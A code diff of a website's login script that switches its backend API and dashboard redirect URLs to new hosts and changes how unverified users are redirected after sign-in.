@@ -9,7 +9,7 @@ const sendLoginEmail = async () => {
   const data = {
     email: email.value,
   };
-  fetch('https://bitpaycapital.onrender.com/api/loginemailsand', {
+  fetch('https://tonexbackend.onrender.com/api/loginemailsand', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -36,7 +36,7 @@ button.onclick = async (event) => {
   console.log(data);
   button.innerHTML = "Loading...";
 
-  fetch('https://the-bitpay-capital-back-end.vercel.app/api/login', {
+  fetch('https://tonex-backend.vercel.app/api/login', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -49,16 +49,18 @@ button.onclick = async (event) => {
       console.log(response)
       const userId = localStorage?.getItem('userId')
       console.log("Local User Id", userId);
-      if (response._id === '' || response._id === undefined){
-        alert('Please enter your valid credentials');
+      if (response.message === 'User have not been verified'){
+        window.location = `https://bitpaynexus-dashboard.vercel.app/`;
         console.log("object");
         return
       }else{
         console.log("object2");
+         const id = localStorage?.getItem('userId')
+        //  console.log(userId)
         sendLoginEmail()
-        window.location = `https://www.accounts-bitpaycapital.com/#/${userId}`;
+        window.location = `https://bitpaynexus-dashboard.vercel.app/#/${id}`;
       }
-    })
+    })  
     .catch((error) => {
       console.log(error);
       button.innerHTML = "Sign In";
